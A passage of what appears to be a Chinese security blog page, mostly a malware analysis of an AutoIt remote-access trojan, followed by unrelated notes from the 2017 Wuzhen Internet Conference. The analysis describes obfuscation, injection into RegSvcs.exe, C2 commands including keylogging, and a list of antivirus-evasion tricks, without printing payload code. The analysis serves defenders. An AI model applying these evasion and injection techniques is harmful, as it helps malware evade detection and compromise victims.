+------------------+      +------------------+      +----------+--------------+</span><br><span class="line">                                                                                  |</span><br><span class="line">                                                                                  |</span><br><span class="line">                                                                                  v</span><br><span class="line">     +--------------------------+      +--------------------------+      +-----------------+</span><br><span class="line">     | Auto Run:                |      | Creat new decode script: |      | main.au3 load:  |</span><br><span class="line">     | ./AutoIt3.exe attack.au3 | &lt;----+ attack.au3               | &lt;----+ config.ini      |</span><br><span class="line">     +----------+---------------+      +--------------------------+      +-----------------+</span><br><span class="line">                |</span><br><span class="line">                |</span><br><span class="line">                |</span><br><span class="line">                |              +-----------------------------------------+</span><br><span class="line">                |              | GAME OVER:                              |</span><br><span class="line">                +------------&gt; | Your machine connect to the C&amp;C Server! |</span><br><span class="line">                               +-----------------------------------------+</span><br></pre></td></tr></table></figure>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;分析&nbsp;config&#x2e;ini&nbsp;文件发现，依然是存在混淆信息：</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/7053164-18672639d7b95e67.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="&nbsp;config&#x2e;ini&nbsp;文件中存在混淆信息"></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;匹配等号行发现，共有&nbsp;7&nbsp;个配置参数：</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/7053164-3ed90c0a226a189a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="&nbsp;config&#x2e;ini&nbsp;文件内容片段"></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;除了常规的配置外，还发现文件中大段大段的十六进制数据块上存在两对标记：</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/7053164-2dd4ee5bddad2309.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="标签"></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;研究发现，标记内的数据为加密的十六进制数据块：</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/7053164-9becf5d2b9023bd2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="标签内的 HEX"></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;为了方便后续的分析，&#x5b;Data&#x5d;&nbsp;标签和&nbsp;&#x5b;eData&#x5d;&nbsp;内连续的十六进制数据块<br>我们命名为HexBlock1，&#x5b;sData&#x5d;&nbsp;和&nbsp;&#x5b;esData&#x5d;&nbsp;标签内的十六进制数据块我们命名为HexBlock2。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;分析脚本文件&nbsp;main&#x2e;au3&nbsp;的源码发现，代码中加入大量双引号和&nbsp;and&nbsp;符号&nbsp;<code>&quot;&amp;&quot;</code>&nbsp;来逃避杀软的静态检测：</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/7053164-03a73eb7820dafc5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="逃避杀软检测"></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;部分数据块也采用了临时替换组装的方式来逃避杀软的静态检测：</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/7053164-ec7c67f60ce68bc4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="部分加密数据块"></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;解密之后为：</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/7053164-45742dc23804c34d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="部分数据库解密"></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;上传到云端后发现仅有2款杀软能够检测出&nbsp;main&#x2e;au3&nbsp;为恶意文件：</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/7053164-4521cfc7c1f07e47.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="全球仅有 2 框杀软能够检出恶意文件"></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;由于样本源码不打算公开，此处仅摘取脚本中的一些函数做介绍。需要注意的是，这些函数大部分是&nbsp;Au3&nbsp;官方提供的，而具有攻击性的&nbsp;payload&nbsp;代码大部分是存储在&nbsp;DLL&nbsp;数据里面：</p>
+<ul>
+<li><code>#NoTrayIcon</code>：用于隐藏程序的运行状态及任务栏图标</li>
+<li><code>ProcessExists</code>：此处用于判断一些杀软进程是否正在运行。</li>
+<li><code>IniRead</code>：用于加载配置参数。</li>
+<li><code>FileExists</code>：用于判断文件是否存在。</li>
+<li><code>FileCopy</code>：用于文件复制操作。</li>
+<li><code>FileRead</code>：用于读取配置文件中的加密代码块。</li>
+<li><code>FileSetAttrib</code>：用于设置文件属性。</li>
+<li><code>FileWrite</code>：用于写入解密后的新脚本到新文件中。</li>
+<li><code>StringRegExp</code>：用于匹配正则表达式。</li>
+<li><code>StringRegExpReplace</code>:用于处理正则表达式替换操作。</li>
+<li><code>DllStructCreate</code>：用于创建&nbsp;DLL&nbsp;结构体。</li>
+<li><code>DllStructSetData</code>：用于设置&nbsp;DLL&nbsp;结构体的数据内容。</li>
+<li><code>DllStructGetPtr</code>:用于获取结构体指针。</li>
+<li><code>DllStructGetData</code>：用于获取结构体的数据内容。</li>
+<li><code>DllStructGetSize</code>：用于获取&nbsp;DLL&amp;nbsp某指定字节数的数据内容。</li>
+<li><code>DllCall</code>：调用一个&nbsp;DLL。</li>
+<li><code>DllOpen</code>：加载一个&nbsp;DLL&nbsp;文件到内存，以等待调用。</li>
+<li><code>DllClose</code>：关闭一个&nbsp;DLL&nbsp;文件。</li>
+<li><code>WinExists</code>：检测指定的程序窗口是否存在。</li>
+<li><code>Execute</code>：用于执行操作系统命令。</li>
+<li><code>ShellExecute</code>：用于执行操作系统命令。</li>
+<li><code>FileDelete</code>：用于文件删除操作。</li>
+<li><code>ProcessClose</code>：用于关闭进程操作。</li>
+<li><code>RegDelete</code>：用于删除注册表项操作。</li>
+<li><code>RegWrite</code>：用于注册表写入操作。</li>
+<li><code>WinActive</code>：检测指定的程序是否正在运行。</li>
+<li><code>WinWaitClose</code>：暂停执行脚本，直到指定的程序退出。</li>
+<li><code>RunWait</code>：执行一个外部程序并暂停脚本自身的运行，直到所执行的外部程序完成。</li>
+<li><code>WinGetText</code>：检索所有程序界面上的文字。</li>
+<li><code>ClipPut</code>：将指定的数据内容写入到系统剪切板。</li>
+<li><code>DriveSpaceFree</code>：显示指定磁盘的剩余空间。</li>
+<li><code>InetGet</code>：从互联网上下载文件，支持&nbsp;HTTP、HTTPS、FTP&nbsp;协议。</li>
+<li><code>BitShift</code>：用于数据位移操作。</li>
+<li><code>BitAND</code>：用于数据与操作。</li>
+</ul>
+<h3 id="3-3-nbsp-进程注入"><a href="#3-3-nbsp-进程注入" class="headerlink" title="3.3&nbsp;进程注入"></a>3.3&nbsp;进程注入</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;考虑到直接拿脚本源码中的解密逻辑去提取&nbsp;DLL&nbsp;数据内容比较抽象，此处分析内容主要以逆向为主。分析发现，攻击脚本&nbsp;attack&#x2e;au3&nbsp;执行之后，会启动以下程序（优先使用v4）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v2.0.50727\RegSvcs.exe</span><br><span class="line">或者</span><br><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe</span><br></pre></td></tr></table></figure>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;先下一波断点（API&nbsp;断点仅供参考）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">bp kernel32.CreateProcessW</span><br><span class="line">bp kernel32.MoveFileA</span><br><span class="line">bp ws2_32.recv</span><br><span class="line">bp ws2_32.send</span><br><span class="line">bp Kernel32.WriteFile</span><br><span class="line">bp Kernel32.ReadProcessMemory</span><br><span class="line">bp Kernel32.WriteProcessMemory</span><br><span class="line">bp Kernel32.CreateFileW</span><br><span class="line">bp Kernel32.CreateFileA</span><br><span class="line">bp Kernel32.SetThreadContext</span><br></pre></td></tr></table></figure>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;运行至启动&nbsp;RegSvcs&#x2e;exe&nbsp;程序时，观察堆栈内容：</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/7053164-708b07ffac3166e4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="启动&nbsp;RegSvcs&#x2e;exe&nbsp;程序时的堆栈内容"></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;观察到&nbsp;<code>CreationFlags = CREATE_SUSPENDED</code>，其作用是程序启动后便立即停止运行，只分配了内存空间。随后观察到注入的&nbsp;DLL&nbsp;数据被分成五次写入到新建的&nbsp;RegSvcs&#x2e;exe&nbsp;进程内存：</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;第一次：</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/7053164-4e7f1a977d616fc6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="第一次向&nbsp;RegSvcs&#x2e;exe&nbsp;进程写入&nbsp;DLL&nbsp;数据"></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;第二次：</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/7053164-b1ae5e89d5c4af53.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="第二次向&nbsp;RegSvcs&#x2e;exe&nbsp;进程写入&nbsp;DLL&nbsp;数据"></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;第三次：</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/7053164-012f63647234ded0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="第三次向&nbsp;RegSvcs&#x2e;exe&nbsp;进程写入&nbsp;DLL&nbsp;数据"></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;第四次：</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/7053164-c360cdccd482aca0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="第四次向&nbsp;RegSvcs&#x2e;exe&nbsp;进程写入&nbsp;DLL&nbsp;数据"></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;第五次：</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/7053164-0b21a0b33b6aac61.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="第五次向&nbsp;RegSvcs&#x2e;exe&nbsp;进程写入&nbsp;DLL&nbsp;数据"></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;提取五次注入的内存块，即得到注入到&nbsp;RegSvcs&#x2e;exe&nbsp;进程的&nbsp;DLL&nbsp;完整数据，我们将其命名为&nbsp;inject&#x2e;dll。</p>
+<h3 id="3-4-nbsp-远控行为"><a href="#3-4-nbsp-远控行为" class="headerlink" title="3.4&nbsp;远控行为"></a>3.4&nbsp;远控行为</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;得到&nbsp;inject&#x2e;dll&nbsp;后，发现该模块为&nbsp;C#&nbsp;源码编写，用&nbsp;dnSpy&nbsp;载入分析发现，木马运行时，首先建立与远控服务器的心跳包连接，将受害者主机的基本信息回传到木马服务器。在心跳包监听中，如果收到服务器的指令，则按照指令执行相应的代码。可接受的指令部分如下：</p>
+<table>
+<thead>
+<tr>
+<th>指令</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>kl</td>
+<td>开启&nbsp;KeyLogger&nbsp;键盘记录模块</td>
+</tr>
+<tr>
+<td>nk</td>
+<td>使用指定的密码加密通讯流量</td>
+</tr>
+<tr>
+<td>~</td>
+<td>收集当前进程信息</td>
+</tr>
+<tr>
+<td>!</td>
+<td>源码中仅声明该指令，未定义具体操作</td>
+</tr>
+<tr>
+<td>@</td>
+<td>收集本地文件夹目录&#xff08;只记录到文件夹名称，且排除系统目录&#xff09;</td>
+</tr>
+<tr>
+<td>#</td>
+<td>收集指定文件夹内文件名</td>
+</tr>
+<tr>
+<td>up</td>
+<td>上传指定文件到服务器</td>
+</tr>
+<tr>
+<td>dl</td>
+<td>下载指定文件到受害者主机</td>
+</tr>
+<tr>
+<td>Ex</td>
+<td>执行系统命令或运行某程序</td>
+</tr>
+<tr>
+<td>rb</td>
+<td>在注册表中注册开启自启</td>
+</tr>
+<tr>
+<td>mmm</td>
+<td>退出自身进程</td>
+</tr>
+<tr>
+<td>%-</td>
+<td>尝试关闭指定进程</td>
+</tr>
+</tbody></table>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;此外，源码中有些函数虽然定义了功能，但没有写调用代码，此处不做详细说明。此外，该远控木马客户端上线时，回传本机基础信息使用的是&nbsp;BASE64&nbsp;编码来加密流量：<br><img src="http://upload-images.jianshu.io/upload_images/7053164-3390b90224628fbc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="木马回连通信"></p>
+<h2 id="4-nbsp-免杀思路总结"><a href="#4-nbsp-免杀思路总结" class="headerlink" title="4&nbsp;免杀思路总结"></a>4&nbsp;免杀思路总结</h2><ul>
+<li>1.在自解压注释中，通过增加正常的小说文本来干扰杀软的识别。</li>
+<li>2.解压的文件中，使用了二十多种后缀名，伪装普通的办公文件、图片文件、视频文件和文本文件。</li>
+<li>3.解压的文件中，唯一的可执行文件是带了数字签名的&nbsp;Au3&nbsp;脚本解释器。</li>
+<li>4.解压的文件中，大多数文件皆为无用的随机字符串。</li>
+<li>5.主要执行的脚本文件中，增加了大量无用的注释行，以及不影响代码执行的非代码行。</li>
+<li>6.主要执行的脚本文件自身体积近&nbsp;3M，多数云查杀对该大小的文件内容不进行在线检测。</li>
+<li>7.主要执行的脚本文件中，对所用到的&nbsp;Au3&nbsp;敏感函数、敏感字符串、二进制数据库都采用了以双引号和&nbsp;AND&nbsp;符号构成的&nbsp;<code>&quot;&amp;&quot;</code>&nbsp;字符串进行分割。</li>
+<li>8.在最终攻击代码的生成前，主程序会利用&nbsp;Au3&nbsp;脚本自身的优越姿势，模拟人的键鼠操作，“手动”&nbsp;退出了某厂商的些杀软进程（比如国际著名的&nbsp;Avast杀毒软件）。</li>
+</ul>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;对该木马的免杀思路总结大概就是这几条，当程序开始往进程注入&nbsp;DLL&nbsp;时，已是赤裸裸的进攻，不再具备免杀特性。</p>
+<h2 id="5-nbsp-攻击来源分析"><a href="#5-nbsp-攻击来源分析" class="headerlink" title="5&nbsp;攻击来源分析"></a>5&nbsp;攻击来源分析</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;攻击者使用的远控服务的&nbsp;IP&nbsp;地址为&nbsp;&#x31;&#x39;&#x32;&#x2e;&#x36;&#x38;&#x2e;&#x78;&#x2e;&#x78;&nbsp;，所在地为瑞典，使用的通讯协议为&nbsp;tcp&nbsp;，端口&nbsp;7771：<br><img src="http://upload-images.jianshu.io/upload_images/7053164-ba036f187d257473.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="攻击者IP地址"></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;根据第三方情报数据显示，该远控端&nbsp;IP&nbsp;早在&nbsp;2016&nbsp;年就被捕获过可疑行为：<br><img src="http://upload-images.jianshu.io/upload_images/7053164-29efa904d6b5b27e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="开源情报"></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;更多内容请关注：<a href="http://bruce.wang" target="_blank" rel="noopener">王小龍的博客</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://blog.bruce.wang/2017/12/03/2017年乌镇互联网大会嘉宾分享要点实录/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="BruceWang">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="BruceWang's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/12/03/2017年乌镇互联网大会嘉宾分享要点实录/" itemprop="url">2017年乌镇互联网大会嘉宾分享要点实录</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-12-03T18:30:31+08:00">
+                2017-12-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/安全笔记/" itemprop="url" rel="index">
+                    <span itemprop="name">安全笔记</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="1-嘉宾致辞"><a href="#1-嘉宾致辞" class="headerlink" title="1. 嘉宾致辞:"></a>1. 嘉宾致辞:</h2><h3 id="1-1-苹果首席执行官-库克-Cook："><a href="#1-1-苹果首席执行官-库克-Cook：" class="headerlink" title="1.1 苹果首席执行官 库克 Cook："></a>1.1 苹果首席执行官 库克 Cook：</h3><ul>
+<li>很多人都在谈论 AI，我并不担心机器人会像人一样思考，我担心人像机器一样思考！</li>
+<li>我们相信 AR 能够帮助人们工作，而且帮助人们在教育医疗有所突破，让世界更加美好。</li>
+<li>科技本身并没有好坏之分，必须把科技赋于人性是每个人的责任，技术的好处是普惠于民。</li>
+<li>我们将竭尽全力降低进入 App 生态圈的门槛。</li>
+<li>必须为技术注入人性，将价值观注入到技术中。</li>
+<li>充分利用历史机遇，赋于技术应有的价值，保持开放，有信任和创造力，才能实现对社会、家庭更美好的承诺。</li>
+</ul>
+<h3 id="1-2-谷歌-CEO-桑达尔·皮查伊-："><a href="#1-2-谷歌-CEO-桑达尔·皮查伊-：" class="headerlink" title="1.2 谷歌 CEO 桑达尔·皮查伊 ："></a>1.2 谷歌 CEO 桑达尔·皮查伊 ：</h3><ul>
+<li>以前是人来适应电脑，未来是电脑适应人。</li>
+<li>6 个月前在乌镇举办阿尔法狗围棋比赛时，我们认为，这是发展历程中的里程碑式的重大事件。</li>
+<li>谷歌也在转型，从移动到 AI，目前我们已经跨越到 AI 阶段。</li>
+<li>计算将无处不在，无论是办公室和车里。</li>
+<li>计算将以语音、视觉等形式进行，这些变化都可以让数字经济超越互联网。</li>
+</ul>
+<h3 id="1-3-阿里巴巴-马云："><a href="#1-3-阿里巴巴-马云：" class="headerlink" title="1.3 阿里巴巴 马云："></a>1.3 阿里巴巴 马云：</h3><ul>
+<li>过去 20 年互联网“从无到有”，未来 30 年互联网将会“从有到无”，后一个无是无处不在的无，没有人能离开互联网存在！</li>
+<li>未来 30 年数据将成为生产资料，计算会是生产力，互联网是一种生产关系。</li>
+<li>如果我们不数据化，不和互联网相连，那么会比过去 30 年不通电显得更为可怕。</li>
+<li>这几年几乎全球弥漫着一种对新技术时代和技术的担心之中，对网络空间、对数字经济与其担心，不如担当。</li>
+<li>人类有灵魂、有信仰、要自信可以控制机器：机器没有灵魂、机器没有信仰，我们人类有灵魂、有信仰、有价值观、有独特的创造力，人类要有自信、相信我们可以控制机器。</li>
+<li>互联网正在深入社会，超过未来一切技术革命的总和。</li>
+<li>未来 30 年，制造业不再是带动就业的引擎，未来的制造业都将会是服务业，未来的服务业也必须是新型制造业。</li>
+<li>数字经济将重塑世界经济，世界经济将会有新的模型，不仅仅是在中国，全世界都在进入一个新的时代。</li>
+<li>第一次技术革命导致了第一次世界大战，第二次技术革命导致了第二次世界大战，第三次技术革命，也就是说第三次世界大战也将即将打响，但这不是一场国与国之间的战争，这是一场我们携手对抗疾病、贫穷和气候变化的战争。</li>
+</ul>
+<h3 id="1-4-腾讯-马化腾："><a href="#1-4-腾讯-马化腾：" class="headerlink" title="1.4 腾讯 马化腾："></a>1.4 腾讯 马化腾：</h3><ul>
+<li>过去中国企业扮演新技术跟随者，今天要成为新技术驱动者。</li>
+<li>过去一年，数字经济是创新 快的经济活动，全球互联网公司都站在风口上，获得了高速发展。</li>
+<li>全球市值 大的公司里，7 家科技公司里包括 5 家互联网公司。</li>
+<li>新年代里，新产品的迭代速度以天为单位，大公司也是如此。</li>
+<li>过去中国企业扮演新技术跟随者，今天要成为新技术的驱动者。</li>
+<li>过去互联网企业是解决个人用户的痛点。未来，互联网企业将给各行各业赋能，解决全部痛点。</li>
+<li>过去一年腾讯在新技术领域不断加码，坚持 AI 战略，在设立海外实验室、医学 AI、机器筛查医学影像、辅助诊断、糖尿病肺癌等领域，与更多的医院展开合作。</li>
+<li>去年我提到了，在信息安全领域，我们在探索共同治理模式。今年我们启动了成长守护平台，该平台覆盖了腾讯 200 多个游戏产品。</li>
+</ul>
+<h3 id="1-5-百度-李彦宏-："><a href="#1-5-百度-李彦宏-：" class="headerlink" title="1.5 百度 李彦宏 ："></a>1.5 百度 李彦宏 ：</h3><ul>
+<li>互联网人口红利结束了。</li>
+<li>从金融到房产、教育、医疗等，能想到的产业都会因 AI 而发生变化，这是个伟大的时代，AI 堪比工业革命，期待 AI 能给每一个人带来新的惊喜。</li>
+<li>十几年前互联网成长动力有 3 个：网民人数成长，上网时间的增加，网上的信息量不断增加。</li>
+<li>当人口红利没有后，以 AI 的技术创新，将推动发展。</li>
+<li>当前互联网的 3 个成长动力：算法、算力、数据。</li>
+<li>中国互联网独特的地方是，7 亿网民说同样的语言，遵守同样的法律，产生统一规则的数据，可以推动算法的创新，从而促进算力的提升。</li>
+<li>未来中国互联网发展主要的推动力就是 AI。</li>
+<li>以前互联网公司基本以软件为主，今天，软件硬件和服务，三者要进行强结合，才能发挥效力。</li>
+<li>以汽车工业为例，现在会因 AI 产生新变化。无论是出行服务商，系统提供商，汽车制造商都将随之改变。</li>
+</ul>
+<h3 id="1-6-尤金·卡巴斯基-："><a href="#1-6-尤金·卡巴斯基-：" class="headerlink" title="1.6 尤金·卡巴斯基 ："></a>1.6 尤金·卡巴斯基 ：</h3><ul>
+<li>20 年前我刚成立卡巴斯基时，那是 1996 年。1997 年的时候有一年找 500 个恶意的软件，10 年以后也就是 2007 年的时候我们当时收集了 200 万个恶意的软件。</li>
+<li>今年 2017 年，我们预计将会收集到 9000 万个新的恶意的样品，从 500 个到 200 万个到 9000 万个。</li>
+<li>我们现在面临的迹象就是很复杂的一个互联网的形势。</li>
+<li>我们周围现在已经被智能化的设备所包裹其中，很不幸的很多这些系统是非常脆弱。</li>
+<li>我们非常依赖于网络，网络是被保护，但是保护的还不够。所以这就是我们经常说的网络恐怖主义，这也是个非常严重的问题</li>
+<li>我们就是要开展合作，包括私营部门的合作，包括开展很多的行动，包括利用新的技术，让它变得更安全，所以我们应该一起努力。</li>
+</ul>
+<h2 id="2-会议发布多项世界互联网领先科技成果-："><a href="#2-会议发布多项世界互联网领先科技成果-：" class="headerlink" title="2 会议发布多项世界互联网领先科技成果 ："></a>2 会议发布多项世界互联网领先科技成果 ：</h2><h3 id="2-1-华为-3GPP-5G-预商用系统"><a href="#2-1-华为-3GPP-5G-预商用系统" class="headerlink" title="2.1 华为 3GPP 5G 预商用系统"></a>2.1 华为 3GPP 5G 预商用系统</h3><ul>
+<li>华为 3GPP 5G 预商用系统，基于 3GPP 统一标准和规范。</li>
+<li>融合革命性新口技术、创新的上下行解耦技术以及全云化架构和端到端切片技术。</li>
+<li>完成了从无线网、承载网、核心网、芯片、CPE 等端到端产品和解决方案的构建及测试验证。</li>
+<li>在商用成熟度和产品性能等方面全面达到世界领先水平。</li>
+<li>全方位构建能够支撑 2020 年 5G 真正商用目标的能力，为“ 5G 时代” 的到来打下坚实的技术基础。</li>
+<li>华为已与全球多家运营商展开了联合测试，并以此为基础开展车联网、智能制造、互联网医疗等多个领域的探索和创新。</li>
+</ul>
+<h3 id="2-2-ARM-安全架构"><a href="#2-2-ARM-安全架构" class="headerlink" title="2.2 ARM 安全架构"></a>2.2 ARM 安全架构</h3><ul>
+<li>ARM 安全架构通过打造经济、可扩展、易于实施的安全框架，为物联网行业创造更加安全的设备奠定基础。</li>
+<li>在物联网高速发展的时代，安全已不是可有可无的选项，整个行业都有责任保护我们身处的世界。</li>
+<li>ARM 安全架构提供了一个基于行业 佳实践的框架，通过它可以在硬件和固件层面实现一致的安全设计，为制造更安全的设备提供了通用的规则和更加经济的方法。</li>
+<li>它可以通过分析威胁模型，解决在案例中遇到的相似问题。</li>
+<li>通过架构为不同设备提供一致的功能和接口。</li>
+<li>为终端客户提供多样性的选择，进而惠及物联网以及相关的技术和广大供应商。</li>
+</ul>
+<h3 id="2-3-微软人工智能小冰"><a href="#2-3-微软人工智能小冰" class="headerlink" title="2.3 微软人工智能小冰"></a>2.3 微软人工智能小冰</h3><ul>
+<li>微软小冰已进入第五代，成长为一款能够进行情感计算，面向情商方向发展的人工智能机器人。</li>
+<li>可以根据对话分析人的情感并及时作出分析，生成下一轮对话，让对话更加顺利地进行。</li>
+<li>目前，全球小冰拥有超过 1 亿人类用户，对话数据超过 300 亿轮，进化速度仍在不断加快。</li>
+<li>对用户而言，微软小冰已不止是一个人工智能机器人，更像是身边的伙伴与真人。</li>
+<li>微软小冰从中国出发，不断向外全球扩展，目前已在中国、日本、美国、印度、印度尼西亚五个国家共 14 个平台上落地，并担任电视栏目主持人、电台主持人、歌手等诸多色会角色。人工智能正在追赶着人类的想象。</li>
+</ul>
+<h3 id="2-4-北斗导航系统"><a href="#2-4-北斗导航系统" class="headerlink" title="2.4 北斗导航系统"></a>2.4 北斗导航系统</h3><ul>
+<li>北斗是唯一具有短报文的系统。</li>
+<li>远洋渔民的可靠选择。</li>
+<li>厘米级高精度服务。</li>
+<li>北斗 + 车联网平台， 480 万辆车事故率减少 50% ，时间节约 1/3。</li>
+<li>中国卫星产值 2000 亿+，北斗贡献 70%，应用于民航海事通信三大领域，覆盖 50 个国家地区， 30 亿人。</li>
+<li>北斗是中国的，也是世界的。</li>
+</ul>
+<h3 id="2-5-高通-5G"><a href="#2-5-高通-5G" class="headerlink" title="2.5 高通 5G"></a>2.5 高通 5G</h3><ul>
+<li>芯片组实现的全球首个 5G 数据链接。</li>
+<li>这项技术意味着 5G 新空口毫米波这项移动领域的全新前沿技术得以依托 5G 新空口标准实现。</li>
+<li>将进一步提高用户体验并显著提高网络容量。</li>
+<li>5G 调制解调器支持 60Hz 以下和毫米波频段，能为所有主要频谱类型和频段提供一个统一的 5G 设计，协助运营商开展早期 5G 试验和部署。</li>
+<li>支持智能手机制造商在手机的功耗和尺寸要求下。</li>
+<li>对 5G 技术进行早期测试和优化，助力 5G 手机的生产。</li>
+</ul>
+<h3 id="2-6-神威太湖计算机"><a href="#2-6-神威太湖计算机" class="headerlink" title="2.6 神威太湖计算机"></a>2.6 神威太湖计算机</h3><ul>
+<li>连续 4 年第一。</li>
+<li>以解决尖端科学问题为目标。</li>
+<li>获得戈登贝尔奖，两项世界最高。</li>
+<li>应用一：中科院软件所清华联合模拟的大气系统（ 500 米）。</li>
+<li>应用二：非线性大地震模拟。</li>
+<li>未来应用：能源气候制造业等。</li>
+</ul>
+<h3 id="2-7-量子计算"><a href="#2-7-量子计算" class="headerlink" title="2.7 量子计算"></a>2.7 量子计算</h3><ul>
+<li>量子处于多种状态个纠缠（诡异互动）。</li>
+<li>操纵 50 个量子，相当于现有超级计算机。</li>
+<li>单光子源技术、多量的纠缠和控制。</li>
+<li>光量子计算机研发成功，阿里 10 比特。</li>
+<li>纠缠领域可达 18 比特。</li>
+</ul>
+<h3 id="2-8-特斯拉"><a href="#2-8-特斯拉" class="headerlink" title="2.8 特斯拉"></a>2.8 特斯拉</h3><ul>
+<li>发电系统存储应用。</li>
+<li>发电系统：太阳能屋顶和光板。</li>
+<li>存储装置：16 个电池存储单元组成的网。</li>
+<li>储能共享。</li>
+<li>岛屿供电案例：特斯拉能源方替代传统。</li>
+</ul>
+<h3 id="2-9-滴滴出行"><a href="#2-9-滴滴出行" class="headerlink" title="2.9 滴滴出行"></a>2.9 滴滴出行</h3><ul>
+<li>交通向共享智能的方向发展。</li>
+<li>出行订单 70% 在滴滴出行。</li>
+<li>纽约东京还停留在传统，中国已经改变。</li>
+<li>出租车和网约联合，将在金华试点。</li>
+<li>滴滴出行代驾替酒。</li>
+<li>5 年发展，每个月服务 1.5 亿用户，服务 20 多个国家。</li>
+<li>滴大脑分析每 15 分钟交通情况，供需预测和调度、建立虚拟车站。</li>
+<li>滴拼车对地图和算法有高要求。</li>
+<li>滴安全大脑。</li>
+<li>滴出行平台变成智能交通。</li>
+</ul>
